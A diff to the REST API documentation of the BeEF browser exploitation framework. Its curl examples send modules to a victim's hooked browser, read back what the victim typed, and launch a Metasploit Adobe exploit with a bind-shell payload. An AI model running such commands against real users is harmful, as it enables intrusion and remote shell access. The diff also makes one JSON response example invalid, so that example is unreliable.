@@ -173,7 +173,9 @@ The _modules_ handler do multiple things:
 }
 ```
 **===Send a command module to the specified hooked browser**
-NOTE: the request header must contain `Content-Type: application/json; charset=UTF-8` and the request body must be valid JSON.  
+
+NOTE: the request header must contain `Content-Type: application/json; charset=UTF-8` and the request body must be valid JSON. In the following example we send the _prompt-dialog_ command module: according to the previous _/api/modules/71_ call, we can specify the _question_ input with our custom value. 
+
 **Request** => POST /api/modules/:session/:module_id
 
 `curl -H "Content-Type: application/json; charset=UTF-8" -d '{"question":"wtf?"}' -X POST http://beefserver.com:3000/api/modules/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk/71?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`
@@ -188,6 +190,8 @@ NOTE: the request header must contain `Content-Type: application/json; charset=U
 ```
 **===Return information about the specific command module previously executed===**
 
+Reusing the previous example, we want to know the command module execution results (or, what the victim entered to the prompt dialog). In this case the victim entered _don't know_ :D
+
 **Request** => GET /api/modules/:session/:mod_id/:cmd_id
 
 `curl http://beefserver.com:3000/api/modules/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk/71/1?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`
@@ -197,6 +201,25 @@ NOTE: the request header must contain `Content-Type: application/json; charset=U
 ```json
 {
     "date": "1332260323",
-    "data": "{\"data\":\"answer=don't know\"}"
+    "data": "{"data":"answer=don't know"}"
+}
+```
+**===Send a Metasploit module===**
+
+NOTE: the request header must contain `Content-Type: application/json; charset=UTF-8` and the request body must be valid JSON. In the following example we send the _Adobe FlateDecode Stream Predictor 02 Integer Overflow_. Metasploit modules will be listed together with BeEF modules, marked with the _metasploit_ category.
+
+**Request** => POST /api/modules/:session/:module_id
+
+`curl -H "Content-Type: application/json; charset=UTF-8" -d '{"SRVPORT":"3992", "URIPATH":"77345345345dg", "PAYLOAD":"generic/shell_bind_tcp"}' -X POST http://beefserver.com:3000/api/modules/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk/236?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`
+
+**Response**
+
+NOTE: in this case we cannot query BeEF nor Metasploit if module execution was successful or not.
+This is why there is "command_id":"not_available" in the response.
+
+```json
+{
+    "success": "true",
+    "command_id": "not_available"
 }
 ```
